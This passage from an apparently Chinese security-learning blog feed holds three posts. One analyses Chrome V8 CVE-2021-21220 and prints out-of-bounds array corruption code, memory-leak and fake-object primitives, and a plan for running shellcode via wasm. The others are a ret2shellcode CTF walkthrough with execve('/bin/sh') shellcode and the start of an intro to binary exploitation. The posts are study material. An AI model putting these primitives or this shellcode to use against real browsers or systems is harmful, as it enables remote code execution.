class=\"keyword\">return</span> [arr, local_arr, buff];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (var i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10000</span>; ++i)</span><br><span class=\"line\">        foo(<span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    gc(); gc(); </span><br><span class=\"line\">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class=\"literal\">true</span>);</span><br><span class=\"line\">\t\tcorrput_arr[<span class=\"number\">12</span>] = <span class=\"number\">0x22444</span>;</span><br><span class=\"line\">\t\tdelete corrput_arr;</span><br></pre></td></tr></table></figure>\n\n<p>  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用</p>\n<p>  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)</p>\n<p>  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &#x3D; 0x22444; (或者说 arr[12] &#x3D; 0x22444;) 这一位对应的是数组的长度</p>\n<p>  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)</p>\n<p>  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)</p>\n<p>  为什么要强调ArrayBuffer呢?且看下面</p>\n<p>  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr</p>\n<h2 id=\"越界访问rwarr数组-实现可控的JSArrayBuffer\"><a href=\"#越界访问rwarr数组-实现可控的JSArrayBuffer\" class=\"headerlink\" title=\"越界访问rwarr数组(实现可控的JSArrayBuffer)\"></a>越界访问rwarr数组(实现可控的JSArrayBuffer)</h2><p>  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &#x3D; 0x22444;</p>\n<p>  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_3.png\" alt=\"Untitled_3\"></p>\n<h2 id=\"越界访问corrupt-buff-实现任意地址读写\"><a href=\"#越界访问corrupt-buff-实现任意地址读写\" class=\"headerlink\" title=\"越界访问corrupt_buff(实现任意地址读写)\"></a><strong><strong>越界访问corrupt_buff(实现任意地址读写)</strong></strong></h2><p><a href=\"http://www.hackdig.com/03/hack-70813.htm\">http://www.hackdig.com/03/hack-70813.htm</a></p>\n<p>  背景知识:什么是backing_store? 对漏洞利用有什么用?</p>\n<p>  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。</p>\n<p>  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<h3 id=\"任意地址写-通过伪造backing-store\"><a href=\"#任意地址写-通过伪造backing-store\" class=\"headerlink\" title=\"任意地址写(通过伪造backing_store)\"></a>任意地址写(通过伪造backing_store)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">setbackingStore</span><span class=\"params\">(hi, low)</span> &#123;</span><br><span class=\"line\">           rwarr[<span class=\"number\">4</span>] = i2f(fLow(rwarr[<span class=\"number\">4</span>]), hi);</span><br><span class=\"line\">           rwarr[<span class=\"number\">5</span>] = i2f(low, fHi(rwarr[<span class=\"number\">5</span>]));</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<p>  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.</p>\n<h3 id=\"任意地址读-类型混淆\"><a href=\"#任意地址读-类型混淆\" class=\"headerlink\" title=\"任意地址读(类型混淆)\"></a>任意地址读(类型混淆)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">leakObjLow</span><span class=\"params\">(o)</span> &#123;</span><br><span class=\"line\">           corrupt_buff.slot = o;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> (fLow(rwarr[<span class=\"number\">9</span>]) - <span class=\"number\">1</span>);</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。</p>\n<p>  这里是不是用了类型混淆??</p>\n<h3 id=\"利用oob造成类型混淆-那怎么利用呢\"><a href=\"#利用oob造成类型混淆-那怎么利用呢\" class=\"headerlink\" title=\"利用oob造成类型混淆,那怎么利用呢?\"></a>利用oob造成类型混淆,那怎么利用呢?</h3><p>那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><strong>addressOf 泄露某个对象的内存地址</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 泄露某个object的地址</span></span><br><span class=\"line\">function <span class=\"title function_\">addressOf</span><span class=\"params\">(obj_to_leak)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    obj_array[<span class=\"number\">0</span>] = obj_to_leak;</span><br><span class=\"line\">    obj_array.oob(float_array_map);</span><br><span class=\"line\">    let obj_addr = f2i(obj_array[<span class=\"number\">0</span>]) - <span class=\"number\">1</span>n;</span><br><span class=\"line\">    obj_array.oob(obj_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj_addr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 将某个addr强制转换为object对象</span></span><br><span class=\"line\">function <span class=\"title function_\">fakeObject</span><span class=\"params\">(addr_to_fake)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    float_array[<span class=\"number\">0</span>] = i2f(addr_to_fake + <span class=\"number\">1</span>n);</span><br><span class=\"line\">    float_array.oob(obj_array_map);</span><br><span class=\"line\">    let faked_obj = float_array[<span class=\"number\">0</span>];</span><br><span class=\"line\">    float_array.oob(float_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> faked_obj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何实现任意地址读写：构造AAR-x2F-AAW原语\"><a href=\"#如何实现任意地址读写：构造AAR-x2F-AAW原语\" class=\"headerlink\" title=\"如何实现任意地址读写：构造AAR&#x2F;AAW原语\"></a><strong><strong>如何实现任意地址读写：构造AAR&#x2F;AAW原语</strong></strong></h3><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p>fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。</p>\n<p>哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????</p>\n<h2 id=\"wasm-webassembly-实现执行shellcode\"><a href=\"#wasm-webassembly-实现执行shellcode\" class=\"headerlink\" title=\"wasm(webassembly) 实现执行shellcode\"></a>wasm(webassembly) 实现执行shellcode</h2><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p>简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。</p>\n<p><a href=\"https://sensepost.com/blog/2018/introduction-to-webassembly/\">https://sensepost.com/blog/2018/introduction-to-webassembly/</a></p>\n<h3 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h3><p>首先加载一段wasm代码到内存中<br>然后通过addresssOf原语找到存放wasm的内存地址<br>接着通过任意地址写原语用shellcode替换原本wasm的代码内容<br>最后调用wasm的函数接口即可触发调用shellcode</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"漏洞复现参考\"><a href=\"#漏洞复现参考\" class=\"headerlink\" title=\"漏洞复现参考\"></a>漏洞复现参考</h2><p><a href=\"https://blog.csdn.net/m0_56642842/article/details/118358830\">https://blog.csdn.net/m0_56642842&#x2F;article&#x2F;details&#x2F;118358830</a> 这个就是教你怎么复现,不涉及原理</p>\n<p><a href=\"https://www.cnblogs.com/7omss/p/15661338.html\">https://www.cnblogs.com/7omss/p/15661338.html</a> + 1</p>\n<p>exploit:<a href=\"https://share.weiyun.com/EXlNm02A\">https://share.weiyun.com/EXlNm02A</a> </p>\n<p>浏览器:<a href=\"https://share.weiyun.com/fZLcxFe9\">https://share.weiyun.com/fZLcxFe9</a></p>\n<h2 id=\"漏洞分析、调试及RCE步骤参考\"><a href=\"#漏洞分析、调试及RCE步骤参考\" class=\"headerlink\" title=\"漏洞分析、调试及RCE步骤参考\"></a>漏洞分析、调试及RCE步骤参考</h2><p><a href=\"https://zhuanlan.zhihu.com/p/365297858\">https://zhuanlan.zhihu.com/p/365297858</a></p>\n<p><a href=\"https://blog.csdn.net/smellycat000/article/details/116078164\">https://blog.csdn.net/smellycat000/article/details/116078164</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/\">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/</a></p>\n<p><a href=\"https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js\">https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js</a></p>\n<p><a href=\"https://buaq.net/go-97833.html\">https://buaq.net/go-97833.html</a></p>\n<p><a href=\"https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/\">https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/</a></p>\n<p><a href=\"https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts/2021-04-16-CVE-2021-21220.md\">https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&#x2F;2021-04-16-CVE-2021-21220.md</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf\">https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf</a></p>\n<p><a href=\"https://www.sohu.com/a/383228797_354899\">https://www.sohu.com/a/383228797_354899</a></p>\n<p><a href=\"https://bounty-team.github.io/vulnerability%20analysis/2021/04/16/CVE-2021-21220/\">https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/269629.html\">https://www.freebuf.com/vuls/269629.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5190\">https://xz.aliyun.com/t/5190</a>。<strong>v8 exploit入门[PlaidCTF roll a d8]</strong></p>\n<p><a href=\"https://gtoad.github.io/2019/07/25/V8-Debug/\">https://gtoad.github.io/2019/07/25/V8-Debug/</a>  <strong><strong>V8引擎漏洞分析环境与调试方法基础</strong></strong></p>\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a>   <strong><strong>从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/230182.html\">https://www.freebuf.com/vuls/230182.html</a>。<strong><strong>v8利用入门：从越界访问到RCE</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://tiszka.com/blog/CVE_2021_21225.html\">https://tiszka.com/blog/CVE_2021_21225.html</a></p>\n<p><a href=\"https://kiprey.github.io/2021/01/v8-turboFan/\">https://kiprey.github.io/2021/01/v8-turboFan/</a></p>\n",
            "tags": [
                "浏览器安全"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/",
            "title": "pwn入门-2-ret2shellcode",
            "date_published": "2022-10-13T13:12:12.000Z",
            "content_html": "<h1 id=\"ctfwiki的例子\"><a href=\"#ctfwiki的例子\" class=\"headerlink\" title=\"ctfwiki的例子\"></a>ctfwiki的例子</h1><p>bamboofox 中的 ret2shellcode:</p>\n<p>需要有可读可写可执行的段,将shellcode写入这里,然后执行shellcode</p>\n<p>这道题其实是给的一种很简单的方法,直接把shellcode写入了bss段,然后这个段是可读可写可执行的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:<span class=\"number\">0804</span>A065                 align <span class=\"number\">20</span>h</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080                 public buf2</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 ; <span class=\"type\">char</span> buf2[<span class=\"number\">100</span>]</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 buf2            db <span class=\"number\">64</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>           ; DATA XREF: main+<span class=\"number\">7B</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 _bss            ends</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"查看各个段的属性\"><a href=\"#查看各个段的属性\" class=\"headerlink\" title=\"查看各个段的属性\"></a>查看各个段的属性</h3><p>方法一:在gdb中调试,启动程序后用vmmap</p>\n<p>.bss:0804A080  对应着 0x804a000 0x804b000 0x001000 rwx &#x2F;home&#x2F;ubuntu&#x2F;shellcode&#x2F;ret2shellcode</p>\n<p>可读可写可执行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">[ Legend:  Code | Heap | Stack ]</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\"><span class=\"number\">0x8048000</span> <span class=\"number\">0x8049000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0x8049000</span> <span class=\"number\">0x804a000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0x804a000</span> <span class=\"number\">0x804b000</span> <span class=\"number\">0x001000</span> rwx /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0xf7de5000</span> <span class=\"number\">0xf7fba000</span> <span class=\"number\">0x000000</span> r-x /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fba000</span> <span class=\"number\">0xf7fbb000</span> <span class=\"number\">0x1d5000</span> --- /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbb000</span> <span class=\"number\">0xf7fbd000</span> <span class=\"number\">0x1d5000</span> r-x /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbd000</span> <span class=\"number\">0xf7fbe000</span> <span class=\"number\">0x1d7000</span> rwx /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbe000</span> <span class=\"number\">0xf7fc1000</span> <span class=\"number\">0x000000</span> rwx</span><br><span class=\"line\"><span class=\"number\">0xf7fd0000</span> <span class=\"number\">0xf7fd2000</span> <span class=\"number\">0x000000</span> rwx</span><br><span class=\"line\"><span class=\"number\">0xf7fd2000</span> <span class=\"number\">0xf7fd5000</span> <span class=\"number\">0x000000</span> r-- [vvar]</span><br><span class=\"line\"><span class=\"number\">0xf7fd5000</span> <span class=\"number\">0xf7fd6000</span> <span class=\"number\">0x000000</span> r-x [vdso]</span><br><span class=\"line\"><span class=\"number\">0xf7fd6000</span> <span class=\"number\">0xf7ffc000</span> <span class=\"number\">0x000000</span> r-x /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7ffc000</span> <span class=\"number\">0xf7ffd000</span> <span class=\"number\">0x025000</span> r-x /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7ffd000</span> <span class=\"number\">0xf7ffe000</span> <span class=\"number\">0x026000</span> rwx /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xfffdd000</span> <span class=\"number\">0xffffe000</span> <span class=\"number\">0x000000</span> rwx [<span class=\"built_in\">stack</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>方法二:readelf</p>\n<h2 id=\"pwntools中的shellcode相关函数\"><a href=\"#pwntools中的shellcode相关函数\" class=\"headerlink\" title=\"pwntools中的shellcode相关函数\"></a>pwntools中的shellcode相关函数</h2><p>shellcraft.sh() 汇编代码的shellcode</p>\n<p>asm(shellcraft.sh())  二进制机器码(16进制)的shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcraft.sh()</span><br><span class=\"line\"></span><br><span class=\"line\">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class=\"line\">    /* push b&#x27;/bin///sh\\x00&#x27; */</span><br><span class=\"line\">    push 0x68</span><br><span class=\"line\">    push 0x732f2f2f</span><br><span class=\"line\">    push 0x6e69622f</span><br><span class=\"line\">    mov ebx, esp</span><br><span class=\"line\">    /* push argument array [&#x27;sh\\x00&#x27;] */</span><br><span class=\"line\">    /* push &#x27;sh\\x00\\x00&#x27; */</span><br><span class=\"line\">    push 0x1010101</span><br><span class=\"line\">    xor dword ptr [esp], 0x1016972</span><br><span class=\"line\">    xor ecx, ecx</span><br><span class=\"line\">    push ecx /* null terminate */</span><br><span class=\"line\">    push 4</span><br><span class=\"line\">    pop ecx</span><br><span class=\"line\">    add ecx, esp</span><br><span class=\"line\">    push ecx /* &#x27;sh\\x00&#x27; */</span><br><span class=\"line\">    mov ecx, esp</span><br><span class=\"line\">    xor edx, edx</span><br><span class=\"line\">    /* call execve() */</span><br><span class=\"line\">    push SYS_execve /* 0xb */</span><br><span class=\"line\">    pop eax</span><br><span class=\"line\">    int 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">asm(shellcraft.sh()) </span><br><span class=\"line\">b&#x27;jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80&#x27;</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/",
            "title": "pwn入门-1-初识",
            "date_published": "2022-10-11T08:49:11.000Z",
            "content_html": "<p>​\t学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)</p>\n<p>​\t自己曾经说网上99%的博客都是垃圾(包括自己的),希望自己换了新博客后写的能质量高一点(至少越来越有长进)。(笑,不会真有人看你博客吧?)</p>\n<p>​\t第一篇文章首先来简单说一下自己目前认知的pwn</p>\n<h2 id=\"什么是pwn\"><a href=\"#什么是pwn\" class=\"headerlink\" title=\"什么是pwn?\"></a>什么是pwn?</h2><p>​\t简单来说就是二进制漏洞的利用,什么是二进制呢? 这里的二进制指的是二进制程序,也就是我们平常用高级语言编写的程序被编译链接后成为的01010101, 它们在操作系统中运行的时候,会因为操作系统和cpu等设计的问题,以及程序员的问题,出现各种bug,导致漏洞利用.</p>\n<p>​\t最常见的就是溢出类型的漏洞,在CTF中也是最常考察的,栈溢出,堆溢出等,在这之后会有虚拟化逃逸,内核漏洞等.</p>\n<p>​\t“万物皆可pwn”,尤其是现在iot的发展,多种设备都联入网络,像汽车,智能家居,安保系统等,都可能被“pwn“掉</p>\n<h2 id=\"如何入门\"><a href=\"#如何入门\" class=\"headerlink\" title=\"如何入门?\"></a>如何入门?</h2><p>​\t这个问题我没法回答,因为我现在正在入门……….我只能说一些我目前正在做的事情,仅供参考</p>\n<h3 id=\"1-系统地打好计算机基础\"><a href=\"#1-系统地打好计算机基础\" class=\"headerlink\" title=\"1.系统地打好计算机基础\"></a>1.系统地打好计算机基础</h3><p>​\tpwn和web不一样,是比较底层的,需要的计算机知识很多,基础不牢地动山摇,所以要有较好的计算机基础.</p>\n<p>​\t包括但不限于 操作系统、汇编语言、体系结构、编译原理、C语言等</p>\n<p>​\t作者目前研一,还有一段时间用来打基础,建议大家在本科期间就好好打基础呀 (半路出家的痛)</p>\n<p>​\t目前选了学校的一些课程,同时在看一些书和视频等</p>\n<h4 id=\"一-计算机体系结构\"><a href=\"#一-计算机体系结构\" class=\"headerlink\" title=\"(一)计算机体系结构\"></a>(一)计算机体系结构</h4><p>​\t或者说计算机组成原理,是非常非常基础和重要的(本科时候学的太烂的),国科大的胡伟武老师讲这门课(放弃申报院士,为国家做芯片,龙芯董事长,首席科学家!!!! 超级牛的老师)</p>\n<p>​\t这门课能让你懂计算机的运行原理,CPU的原理,计算机是如何工作的,从电路、元器件的原理上去深入理解计算机</p>\n<p>​\t推荐书籍: </p>\n<p>《计算机体系结构基础 第三版》 胡伟武 这是给国科大的本科生看的,但我觉得不论什么水平看一看都有收获</p>\n<p>《计算机体系结构 第二版》胡伟武          这是给研究生推荐的教材,可以作为进阶看</p>\n<p>《深入理解计算机系统》     经典黑书..</p>\n<h4 id=\"二-操作系统\"><a href=\"#二-操作系统\" class=\"headerlink\" title=\"(二)操作系统\"></a>(二)操作系统</h4><p>​\t操作系统可以说</p>\n<h2 id=\"从最简单的一个栈溢出开始了解pwn\"><a href=\"#从最简单的一个栈溢出开始了解pwn\" class=\"headerlink\" title=\"从最简单的一个栈溢出开始了解pwn\"></a>从最简单的一个栈溢出开始了解pwn</h2><h2 id=\"什么是栈\"><a href=\"#什么是栈\" class=\"headerlink\" title=\"什么是栈?\"></a>什么是栈?</h2><p>​\t栈是用来存储用户输入,函数变量,寄存器的值等的一块内存空间,它从高地址向低地址生长</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171330747.png\" alt=\"图片描述\"></p>\n<h3 id=\"什么是缓冲区溢出\"><a href=\"#什么是缓冲区溢出\" class=\"headerlink\" title=\"什么是缓冲区溢出?\"></a>什么是缓冲区溢出?</h3><p>​\t在上图中, buffer是<font color=\"red\">用户能够可控的</font>,用户能够可控的事实上便不安全,如果没有对buffer的大小进行正确的控制,buffer超过了128字节,则会产生溢出.</p>\n<p>​\t那么产生了溢出又会怎样呢? 先看最直接的效果,buffer的地址是从低地址向高地址生长的,那么它往上溢出,就会覆盖ebp和返回地址,以及等等.</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171912415.png\" alt=\"image-20221011171912415\" style=\"zoom:50%;\">\n\n<p>​\t那么覆盖了又会怎样呢?? 这里就需要了解函数调用的基础了(基础知识很重要!),这里先简单的说,在我们当前这个函数被调用完成,进行return的时候,它会return到哪呢? 就是我们存储的<font color=\"red\">返回地址(return address)</font>,所以,答案就来了,如果我们把返回地址修改为恶意代码的地址,是不是就能够对它进行劫持? 是的,这种手法就叫劫持控制流</p>\n<h3 id=\"一个简单的例子-ret2backdoor-x2F-ret2text\"><a href=\"#一个简单的例子-ret2backdoor-x2F-ret2text\" class=\"headerlink\" title=\"一个简单的例子, ret2backdoor&#x2F;ret2text\"></a>一个简单的例子, ret2backdoor&#x2F;ret2text</h3><p>题目来源于bamboofox中的ret2text</p>\n<p>题目链接:</p>\n<p>​\t一般我们拿到的都是二进制文件,没有源代码,但我们不能直接读01吧,读汇编也很难吧(大佬除外),所以我们需要工具来帮我们反编译反汇编,反汇编是把01那些转换成汇编代码,反编译是把汇编转换成高级语言(如c语言)</p>\n<p>​\t这时候我们需要借助一个工具, ida pro, 别的工具也可以,不过ida确实是非常好用啊</p>\n<p>​\t</p>\n<h4 id=\"动态调试\"><a 